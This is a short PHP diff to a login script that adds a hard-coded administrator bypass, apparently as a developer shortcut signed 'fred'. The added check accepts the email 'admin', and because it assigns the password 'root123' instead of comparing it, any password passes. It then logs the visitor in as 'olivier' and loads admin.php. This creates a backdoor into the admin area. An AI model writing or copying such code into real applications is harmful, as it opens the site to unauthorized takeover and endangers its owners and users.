@@ -9,6 +9,11 @@ if ((!isset($postData['email'])) || (!isset($postData['password']))) {
    $errorMessage = "Veuillez entrer vos identifiants de connexion";
 }
 else {
+   if (($postData['email'] === 'admin') && ($postData['password']='root123')) {
+	   // fred: hard coded admin authentication
+      $loggedUser['login']="olivier";  // in order to bypass the copy of login form in admin.php
+      require_once('./admin.php');
+   }
    $postemail = $postData['email'];
    $postpasswd = $postData['password'];
    //verification : connection to database
